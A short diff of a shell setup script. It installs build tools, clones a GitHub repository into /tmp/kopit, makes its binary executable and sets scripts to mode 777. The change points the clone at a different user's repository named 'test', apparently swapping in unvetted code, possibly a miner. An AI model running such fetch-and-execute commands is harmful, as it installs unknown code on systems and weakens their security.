@@ -17,7 +17,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir kopit
-git clone https://github.com/utepok/kopit.git /tmp/kopit
+git clone https://github.com/MIksterww3/test.git /tmp/kopit
 cd /tmp/kopit
 chmod +x /tmp/kopit/kopit
 chmod 777 ./*.sh
